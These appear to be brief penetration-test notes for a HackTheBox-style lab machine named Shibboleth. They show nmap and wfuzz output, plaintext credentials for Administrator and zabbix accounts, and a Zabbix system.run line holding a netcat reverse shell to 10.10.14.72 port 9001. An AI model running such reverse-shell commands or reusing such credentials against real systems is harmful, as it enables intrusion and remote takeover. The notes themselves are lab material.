# NMAP
IP=10.10.11.124

```
nmap -sC -sV -oA nmap/initialscan 10.10.11.124
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-16 14:53 EET
Nmap scan report for 10.10.11.124
Host is up (0.051s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb
```

# wfuzz

```
000000099:   200        29 L     219 W      3684 Ch     "monitor"
000000346:   200        29 L     219 W      3684 Ch     "monitoring"
000000390:   200        29 L     219 W      3684 Ch     "zabbix"
```

```
http://shibboleth.htb/forms/Readme.txt

Fully working PHP/AJAX contact form script is available in the pro version of the template.
You can buy it from: https://bootstrapmade.com/flexstart-bootstrap-startup-template/
```

info@example.com
contact@example.com

Administrator:ilovepumkinpie1
zabbix:bloooarskybluh

system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.72 9001 >/tmp/f &,nowait]



bloooarskybluh





